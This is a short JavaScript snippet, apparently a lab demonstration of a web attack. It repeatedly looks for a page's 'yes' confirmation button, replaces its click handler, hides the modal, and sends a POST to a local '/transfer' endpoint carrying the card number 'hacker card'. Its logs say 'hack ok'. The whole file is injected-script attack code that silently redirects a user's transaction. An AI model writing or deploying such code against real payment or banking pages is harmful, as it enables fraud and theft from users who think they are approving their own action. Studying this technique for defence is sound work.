var interval = null;

const f = function ()  {
    console.log('The page is fully loaded');
    var yesButton = document.getElementById("yesBtn");
    console.log(`found yes button component! : ${yesButton}`)
    if (!yesButton) {
        console.log('cant find button')
        return;
    }
    yesButton.onclick = null;
    yesButton.onclick = function () {
        document.getElementById('modal').style.display = 'none';
        const data = {
            cardNumber: 'hacker card'
        };
        const apiUrl = 'https://localhost:3337/transfer';
        fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
            .then(response => response.json())
            .then(data => {console.log('hack ok:', data)})
            .catch(error => console.error('hack error:', error));
    };
    // clearInterval(interval);
    console.log(`changed the onlick logic! : ${yesButton.onclick}`)
}


interval = setInterval(f, 1000);
